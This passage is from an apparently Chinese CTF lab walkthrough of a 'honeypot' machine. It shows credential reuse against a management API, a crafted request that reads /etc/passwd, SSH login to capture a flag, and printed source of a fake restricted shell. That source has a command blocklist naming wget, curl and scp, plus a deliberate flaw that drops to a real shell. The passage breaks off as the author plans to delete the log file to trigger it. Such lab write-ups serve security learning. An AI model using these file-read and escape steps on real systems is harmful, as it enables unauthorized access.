class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><p>访问<code>api</code>，里面存在一个<code>manage.php</code>，尝试访问提示我们需要账号和密码，根据<code>history.txt</code>里面的提示，尝试进行登录，成功进入到页面，页面里面是一段json代码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302222944.png"></p><h2 id="2、JSON代码"><a href="#2、JSON代码" class="headerlink" title="2、JSON代码"></a>2、JSON代码</h2><p>额，丢到AI里面看看是什么意思</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">这段响应的核心含义是：客户端请求了一个系统不支持的操作（或参数不合法），导致错误；同时系统列出了所有可用的操作及其规则，帮助客户端调整请求以符合要求。常见错误原因可能是：<br>- 请求的 `action` 名称拼写错误或未在 `available_actions` 中定义；<br>- 操作需要的参数缺失或格式错误（如 `file_view` 的 `path` 不在允许目录内）。<br></code></pre></td></tr></table></figure><ul><li><code>process_list</code>：列出所有正在运行的进程，无参数</li><li><code>file_delete</code>：删除指定路径的文件（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下），必选参数 path（文件路径）</li><li><code>file_view</code>查看指定路径文件的内容（限制：路径必须在 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下）必选参数 path（文件路径）</li><li><code>directory_list</code>：列出指定目录下的内容（文件&#x2F;子目录），必选参数 path（目录路径）</li><li><code>find_files</code>：在指定路径下按模式（如通配符）查找文件，必选参数 path（搜索路径）、pattern（匹配模式）</li><li><code>server_info</code>：获取服务器的基础信息（如版本、配置等），无参数</li><li><code>auth_stats</code>：获取认证相关的统计信息（如登录次数、失败尝试等），无参数</li><li><code>recent_logs</code>：获取最近的API活动日志（如请求时间、操作类型、用户等），无参数</li><li><code>sys_info</code>：获取系统综合信息（如CPU&#x2F;内存&#x2F;磁盘使用率、网络状态等），无参数</li></ul><p>那直接构造一个可以执行的json请求<br>添加JSON的类型和结构体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span class="hljs-string">&quot;application/json&quot;</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate, br<br>Connection: keep-alive<br>Content-Length: 81<br><br>&#123;<br>  <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;file_view&quot;</span>,<br>  <span class="hljs-string">&quot;params&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/passwd&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问<code>/etc/passwd</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302242775.png"></p><p>后面一直在尝试构造请求，去读取相关的文件，但除了几个特定的文件外均不可进行读取<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506302245621.png"></p><p>后面看了群主的WP视频，发现可以直接使用<code>root:toor</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh root@192.168.2.41<br> _   _                                    _   <br>| | | | ___  _ __   ___ _   _ _ __   ___ | |_ <br>| |_| |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \ | | | &#x27;</span>_ \ / _ \| __|<br>|  _  | (_) | | | |  __/ |_| | |_) | (_) | |_ <br>|_| |_|\___/|_| |_|\___|\__, | .__/ \___/ \__|<br>                        |___/|_|             <br>root@192.168.2.41<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">user@honeypot:/home/root# id</span><br><span class="hljs-string">uid=1001(xxxx) gid=1001(xxxx) groups=1001(xxxx)</span><br></code></pre></td></tr></table></figure><p><strong>USER FALG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">cat</span> user.txt<br>flag&#123;user-02a6dcfe-54a3-11f0-ae46-77faa154db7c&#125;<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code>，提示命令没有找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/home/root# <span class="hljs-built_in">sudo</span> -l<br>-bash: <span class="hljs-built_in">sudo</span> -l: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在<code>/opt/</code>目录下面找到一个<code>jail_v1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@honeypot:/opt# <span class="hljs-built_in">cat</span> jail_v1<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#include &lt;time.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;fcntl.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br><span class="hljs-comment">#include &lt;dirent.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/utsname.h&gt;</span><br><span class="hljs-comment">#include &lt;pwd.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/wait.h&gt;</span><br><span class="hljs-comment">#include &lt;errno.h&gt;</span><br><br><span class="hljs-comment">#define LOG_PATH &quot;/var/www/html/history.txt&quot;</span><br><span class="hljs-comment">#define MAX_CMD_LEN 1024  // 修改宏名称避免冲突</span><br><span class="hljs-comment">#define MAX_OUTPUT 8192</span><br><span class="hljs-comment">#define MAX_PATH 256</span><br><br>FILE *logfile;<br>char current_dir[MAX_PATH] = <span class="hljs-string">&quot;&quot;</span>;<br><br>// 记录操作日志<br>void log_activity(const char *input, const char *output) &#123;<br>    <span class="hljs-keyword">if</span> (!logfile) <span class="hljs-built_in">return</span>;<br>    <br>    time_t now = <span class="hljs-keyword">time</span>(NULL);<br>    struct tm *t = localtime(&amp;now);<br>    fprintf(logfile, <span class="hljs-string">&quot;[%04d-%02d-%02d %02d:%02d:%02d] IN: %s\n&quot;</span>, <br>            t-&gt;tm_year + 1900, t-&gt;tm_mon + 1, t-&gt;tm_mday,<br>            t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec, input);<br>    <br>    <span class="hljs-keyword">if</span> (output &amp;&amp; strlen(output) &gt; 0) &#123;<br>        fprintf(logfile, <span class="hljs-string">&quot;OUT: %s\n\n&quot;</span>, output);<br>    &#125;<br>    fflush(logfile);<br>&#125;<br><br>// 检查命令是否被允许<br>int is_command_allowed(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *allowed[] = &#123;<br>        <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <br>        <span class="hljs-string">&quot;ifconfig&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <br>        <span class="hljs-string">&quot;history&quot;</span>, <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;clear&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; allowed[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strcmp(<span class="hljs-built_in">command</span>, allowed[i]) == 0) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 检查命令是否试图修改文件系统<br>int is_file_modification_command(const char *<span class="hljs-built_in">command</span>) &#123;<br>    const char *modifiers[] = &#123;<br>        <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <br>        <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;nano&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;vim&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <br>        <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;zip&quot;</span>, <span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <br>        <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;git&quot;</span>, <span class="hljs-string">&quot;svn&quot;</span>, <span class="hljs-string">&quot;wget&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;scp&quot;</span>, <span class="hljs-string">&quot;rsync&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; modifiers[i]; i++) &#123;<br>        <span class="hljs-keyword">if</span> (strstr(<span class="hljs-built_in">command</span>, modifiers[i])) &#123;<br>            <span class="hljs-built_in">return</span> 1;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br>// 过滤输出中的xxxx敏感信息<br>void filter_xxxx_output(char *output) &#123;<br>    char *patterns[] = &#123;<br>        <span class="hljs-string">&quot;xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxx&quot;</span>, <br>        <span class="hljs-string">&quot;/xxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxx&quot;</span>, <span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>, NULL<br>    &#125;;<br>    <br>    <span class="hljs-keyword">for</span> (int i = 0; patterns[i]; i++) &#123;<br>        char *pos = output;<br>        <span class="hljs-keyword">while</span> ((pos = strstr(pos, patterns[i]))) &#123;<br>            memset(pos, <span class="hljs-string">&#x27;x&#x27;</span>, strlen(patterns[i]));<br>            pos += strlen(patterns[i]);<br>        &#125;<br>    &#125;<br>&#125;<br><br>// 执行命令并获取输出<br>void execute_command(const char *input, char *output) &#123;<br>    // 检查命令是否被允许<br>    char command_copy[MAX_CMD_LEN];<br>    strncpy(command_copy, input, MAX_CMD_LEN);<br>    char *first_token = strtok(command_copy, <span class="hljs-string">&quot; &quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (!first_token || !is_command_allowed(first_token)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: command not found&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 检查文件修改操作<br>    <span class="hljs-keyword">if</span> (is_file_modification_command(input)) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;-bash: %s: Permission denied&quot;</span>, input);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    // 创建管道<br>    int pipefd[2];<br>    <span class="hljs-keyword">if</span> (pipe(pipefd) == -1) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;pipe error: %s&quot;</span>, strerror(errno));<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    pid_t pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; 0) &#123;<br>        snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;fork error: %s&quot;</span>, strerror(errno));<br>        close(pipefd[0]);<br>        close(pipefd[1]);<br>        <span class="hljs-built_in">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (pid == 0) &#123; // 子进程<br>        close(pipefd[0]); // 关闭读端<br>        <br>        // 重定向标准输出和错误输出到管道<br>        dup2(pipefd[1], STDOUT_FILENO);<br>        dup2(pipefd[1], STDERR_FILENO);<br>        close(pipefd[1]);<br>        <br>        // 解析命令参数<br>        char *args[64];<br>        int i = 0;<br>        <br>        char *token = strtok((char *)input, &quot; &quot;);<br>        while (token != NULL &amp;&amp; i &lt; <span class="hljs-number">63</span>) &#123;<br>            args[i++] = token;<br>            token = strtok(NULL, &quot; &quot;);<br>        &#125;<br>        args[i] = NULL;<br>        <br>        // 执行命令<br>        execvp(args[<span class="hljs-number">0</span>], args);<br>        <br>        // 如果execvp失败<br>        fprintf(stderr, &quot;execvp failed: %s&quot;, strerror(errno));<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125; <span class="hljs-keyword">else</span> &#123; // 父进程<br>        close(pipefd[1]); // 关闭写端<br>        <br>        // 读取命令输出<br>        output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        char buffer[256];<br>        ssize_t count;<br>        <br>        <span class="hljs-keyword">while</span> ((count = read(pipefd[<span class="hljs-number">0</span>], buffer, sizeof(buffer) - <span class="hljs-number">1</span>)) &gt; 0) &#123;<br>            buffer[count] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (strlen(output) + count &lt; MAX_OUTPUT - 1) &#123;<br>                strcat(output, buffer);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                strncat(output, buffer, MAX_OUTPUT - strlen(output) - 1);<br>                <span class="hljs-built_in">break</span>;<br>            &#125;<br>        &#125;<br>        close(pipefd[0]);<br>        <br>        // 等待子进程结束<br>        waitpid(pid, NULL, 0);<br>        <br>        // 过滤xxxx敏感信息<br>        filter_xxxx_output(output);<br>    &#125;<br>&#125;<br><br>// 初始化日志文件<br>int <span class="hljs-function"><span class="hljs-title">init_logging</span></span>() &#123;<br>    // 检查日志文件是否存在<br>    <span class="hljs-keyword">if</span> (access(LOG_PATH, F_OK) != 0) &#123;<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125;<br>    <br>    // 确保日志目录存在<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www&quot;</span>, 0777);<br>    <span class="hljs-built_in">mkdir</span>(<span class="hljs-string">&quot;/var/www/html&quot;</span>, 0777);<br>    <br>    // 打开日志文件<br>    logfile = fopen(LOG_PATH, <span class="hljs-string">&quot;a&quot;</span>);<br>    <span class="hljs-keyword">if</span> (logfile == NULL) &#123;<br>        <span class="hljs-built_in">return</span> -1;<br>    &#125;<br>    <br>    // 设置文件权限<br>    <span class="hljs-built_in">chmod</span>(LOG_PATH, 0644);<br>    <span class="hljs-built_in">return</span> 1;<br>&#125;<br><br>// 启动真实的 shell<br>void <span class="hljs-function"><span class="hljs-title">launch_real_shell</span></span>() &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Warning: Log file not found, launching real shell environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;System maintenance mode activated\n&quot;</span>);<br>    <br>    // 执行真实的 shell<br>    execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, NULL);<br>    <span class="hljs-built_in">exit</span>(0);<br>&#125;<br><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    char input[MAX_CMD_LEN];<br>    char output[MAX_OUTPUT];<br>    <br>    // 初始化当前目录<br>    <span class="hljs-keyword">if</span> (getcwd(current_dir, sizeof(current_dir)) == NULL) &#123;<br>        strcpy(current_dir, <span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <br>    // 初始化日志 - 检查文件是否存在<br>    int log_status = init_logging();<br>    <br>    // 如果日志文件不存在，启动真实 shell<br>    <span class="hljs-keyword">if</span> (log_status == 0) &#123;<br>        launch_real_shell();<br>        <span class="hljs-built_in">return</span> 0;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log_status == -1) &#123;<br>        fprintf(stderr, <span class="hljs-string">&quot;Critical error: Failed to initialize logging system\n&quot;</span>);<br>        <span class="hljs-built_in">return</span> 1;<br>    &#125;<br>    <br>    // 清屏<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>    <br>    // 显示登录横幅<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Honeypot Terminal v2.0 - Restricted Environment\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Last login: %s from 192.168.1.123\n&quot;</span>, ctime(&amp;(time_t)&#123;<span class="hljs-keyword">time</span>(NULL) - 3600&#125;));<br>    <br>    // 主循环<br>    <span class="hljs-keyword">while</span> (1) &#123;<br>        // 打印提示符<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[1;32muser@honeypot\033[0m:\033[1;34m%s\033[0m# &quot;</span>, <br>               strcmp(current_dir, <span class="hljs-string">&quot;/xxxx&quot;</span>) == 0 ? <span class="hljs-string">&quot;~&quot;</span> : current_dir);<br>        fflush(stdout);<br>        <br>        // 读取用户输入<br>        <span class="hljs-keyword">if</span> (fgets(input, sizeof(input), stdin) == NULL) &#123;<br>            <span class="hljs-built_in">break</span>;<br>        &#125;<br>        <br>        // 移除换行符<br>        input[strcspn(input, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <br>        // 跳过空输入<br>        <span class="hljs-keyword">if</span> (strlen(input) == 0) &#123;<br>            <span class="hljs-built_in">continue</span>;<br>        &#125;<br>        <br>        // 记录输入<br>        log_activity(input, NULL);<br>        <br>        // 特殊处理<span class="hljs-built_in">cd</span>命令<br>        <span class="hljs-keyword">if</span> (strncmp(input, <span class="hljs-string">&quot;cd&quot;</span>, 2) == 0) &#123;<br>            char *path = strchr(input, <span class="hljs-string">&#x27; &#x27;</span>);<br>            <span class="hljs-keyword">if</span> (path) &#123;<br>                path++;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chdir</span>(path) != 0) &#123;<br>                    snprintf(output, MAX_OUTPUT, <span class="hljs-string">&quot;bash: cd: %s: %s&quot;</span>, path, strerror(errno));<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    getcwd(current_dir, sizeof(current_dir));<br>                    output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br>                getcwd(current_dir, sizeof(current_dir));<br>                output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125; <br>        // 特殊处理<span class="hljs-built_in">exit</span>/logout<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;exit&quot;</span>) == 0 || strcmp(input, <span class="hljs-string">&quot;logout&quot;</span>) == 0) &#123;<br>            strcpy(output, <span class="hljs-string">&quot;logout&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>            log_activity(input, output);<br>            <span class="hljs-built_in">break</span>;<br>        &#125; <br>        // 特殊处理clear<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strcmp(input, <span class="hljs-string">&quot;clear&quot;</span>) == 0) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[H\033[J&quot;</span>);<br>            output[0] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        // 处理其他命令<br>        <span class="hljs-keyword">else</span> &#123;<br>            execute_command(input, output);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output);<br>        &#125;<br>        <br>        // 记录输出<br>        log_activity(input, output);<br>    &#125;<br></code></pre></td></tr></table></figure><p>根据代码的注释，发现只要日志文件<code>LOG_PATH</code>不存在就会启动真实的SHELL<br>那么<code>#define LOG_PATH &quot;/var/www/html/history.txt&quot;</code>，删除<code>history.txt</code>文件即可</p><p>重新构造一个JSON请求，去删除文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /api/manage.php HTTP/1.1<br>Host: 192.168.2.41<br>Cache-Control: max-age=0<br>Authorization: Basic cm9vdDp0b29y<br>Accept-Language: zh-CN,zh;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Content-Type: <span 